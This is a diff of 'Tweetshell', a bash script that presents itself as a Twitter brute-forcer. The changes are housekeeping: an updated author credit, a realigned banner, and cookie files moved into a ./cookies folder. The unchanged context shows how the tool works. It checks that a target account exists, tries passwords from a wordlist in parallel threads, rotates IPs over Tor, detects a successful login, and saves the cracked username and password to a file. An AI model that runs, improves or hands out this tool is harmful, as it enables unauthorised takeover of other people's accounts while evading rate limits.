@@ -1,7 +1,6 @@
 #!/bin/bash
 # Tweetshell v1.0
-# Coded by: github.com/thelinuxchoice
-# Instagram: @thelinuxchoice
+# Coded by @thelinuxchoice, updated by @ajmeese7
 
 trap 'store;exit 1' 2
 
@@ -25,14 +24,14 @@ dependencies() {
 }
 
 banner() {
-  printf "\e[1;36m      _  _     _____                 _  \e[1;92m     _          _ _  \e[0m\n"
-  printf "\e[1;36m    _| || |_  |_   _|               | | \e[1;92m    | |        | | | \e[0m\n"
-  printf "\e[1;36m   |_  __  _|   | |_      _____  ___| |_\e[1;92m ___| |__   ___| | | \e[0m\n"
-  printf "\e[1;36m    _| || |_    | \ \ /\ / / _ \/ _ \ __\e[1;92m/ __| '_ \ / _ \ | | \e[0m\n"
-  printf "\e[1;36m   |_  __  _|   | |\ V  V /  __/  __/ |_\e[1;92m\__ \ | | |  __/ | | \e[0m\n"
-  printf "\e[1;36m     |_||_|     \_/ \_/\_/ \___|\___|\__\e[1;92m|___/_| |_|\___|_|_| \e[0m\n"
+  printf "\e[1;36m     _  _     _____                 _  \e[1;92m     _          _ _  \e[0m\n"
+  printf "\e[1;36m   _| || |_  |_   _|               | | \e[1;92m    | |        | | | \e[0m\n"
+  printf "\e[1;36m  |_  __  _|   | |_      _____  ___| |_\e[1;92m ___| |__   ___| | | \e[0m\n"
+  printf "\e[1;36m   _| || |_    | \ \ /\ / / _ \/ _ \ __\e[1;92m/ __| '_ \ / _ \ | | \e[0m\n"
+  printf "\e[1;36m  |_  __  _|   | |\ V  V /  __/  __/ |_\e[1;92m\__ \ | | |  __/ | | \e[0m\n"
+  printf "\e[1;36m    |_||_|     \_/ \_/\_/ \___|\___|\__\e[1;92m|___/_| |_|\___|_|_| \e[0m\n"
   printf "\n"
-  printf "\e[1;77m\e[44m Twitter BruteForcer v1.0 Author: thelinuxchoice (Github/IG)\e[0m\n"
+  printf "\e[1;77m\e[44m      Twitter BruteForcer v1.0 Author: @thelinuxchoice       \e[0m\n"
   printf "\n"
 }
 
@@ -40,16 +39,20 @@ function start() {
   checkroot
   banner
   dependencies
-  read -p $'\e[1;92mUsername account: \e[0m' username
 
+  # Create the 'cookies' directory if it doesn't exist
+  mkdir ./cookies > /dev/null 2>&1
+
+  read -p $'\e[1;92mUsername account: \e[0m' username
   checkaccount=$(curl -L -s https://www.twitter.com/$username/ | grep -c "Sorry, that page doesn’t exist!")
+
   if [[ "$checkaccount" == 1 ]]; then
     printf "\e[1;91mInvalid Username! Try again\e[0m\n"
     sleep 1
     start
   else
     default_wl_pass="passwords.lst"
-    read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
+    read -p $'\e[1;92mPassword list (Enter to default list): \e[0m' wl_pass
     wl_pass="${wl_pass:-${default_wl_pass}}"
     default_threads="10"
     read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
@@ -61,7 +64,7 @@ checktor() {
   check=$(curl  -s https://check.torproject.org > /dev/null; echo $?)
 
   if [[ "$check" -gt 0 ]]; then
-    printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
+    printf "\e[1;91mPlease, check your TOR Connection! Just type 'tor' or 'service tor start'\n\e[0m"
     exit 1
   fi
 }
@@ -75,7 +78,7 @@ function store() {
       sleep 3
     fi
 
-    rm -rf cookies*
+    rm -rf ./cookies/*
     default_session="Y"
     printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $username
     read -p $'\e[1;77m? [Y/n]: \e[0m' session
@@ -86,7 +89,7 @@ function store() {
       fi
       printf "username=\"%s\"\npassword=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $username $password $wl_pass $token > sessions/store.session.$username.$(date +"%FT%H%M")
       printf "\e[1;77mSession saved.\e[0m\n"
-      printf "\e[1;92mUse 'sudo ./instashell --resume'\n"
+      printf "\e[1;92mUse 'sudo ./tweetshell --resume'\n"
     else
       exit 1
     fi
@@ -115,7 +118,7 @@ function bruteforcer() {
     IFS=$'\n'
     for password in $(sed -n ''$startline','$endline'p' $wl_pass); do
       countpass=$(grep -n "$password" "$wl_pass" | cut -d ":" -f1)
-      COOKIES='cookies'$countpass''
+      COOKIES='./cookies/cookie'$countpass''
 
       let token++
       printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
@@ -127,19 +130,19 @@ function bruteforcer() {
           printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password;
           printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell;
           printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m";
-          rm -rf cookies*;
+          rm -rf ./cookies/*;
           kill -1 $$;
         elif [[ "$var" == *"/account/login_challenge"* ]]; then
           printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password;
           printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell;
           printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m";
-          rm -rf cookies*;
+          rm -rf ./cookies/*;
           kill -1 $$;
         elif [[ "$var" == *"/compose/tweet"* ]]; then
           printf "\e[1;92m \n [*] Password Found: %s\n" $password;
           printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell;
           printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m";
-          rm -rf cookies*;
+          rm -rf ./cookies/*;
           kill -1 $$;
         fi;
       )} &
@@ -148,8 +151,8 @@ function bruteforcer() {
     let startline+=$threads
     let endline+=$threads
     changeip
-    rm -rf cookies1
-    rm -rf cookies$countpass
+    rm -rf ./cookies/cookie1
+    rm -rf ./cookies/cookie$countpass
   done
   exit 1
 }
@@ -187,7 +190,7 @@ function resume() {
   while [ $token -lt $count_pass ]; do
     IFS=$'\n'
     for password in $(sed -n '/\b'$password'\b/,'$(($token+threads))'p' $wl_pass); do
-      COOKIES='cookies'$countpass''
+      COOKIES='./cookies/cookie'$countpass''
       countpass=$(grep -n -w "$password" "$wl_pass" | cut -d ":" -f1)
       printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
       let token++
@@ -198,27 +201,27 @@ function resume() {
           printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password;
           printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell;
           printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m";
-          rm -rf cookies*;
+          rm -rf ./cookies/*;
           kill -1 $$;
         elif [[ "$var" == *"/account/login_challenge"* ]]; then
           printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password;
           printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell;
           printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m";
-          rm -rf cookies*;
+          rm -rf ./cookies/*;
           kill -1 $$;
         elif [[ "$var" == *"/compose/tweet"* ]]; then
           printf "\e[1;92m \n [*] Password Found: %s\n" $password;
           printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell;
           printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m";
-          rm -rf cookies*;
+          rm -rf ./cookies/*;
           kill -1 $$;
         fi;
       )} &
     done; wait $!;
 
     changeip
-    rm -rf cookies1
-    rm -rf cookies$countpass
+    rm -rf ./cookies/cookie1
+    rm -rf ./cookies/cookie$countpass
   done
   exit 1
 }
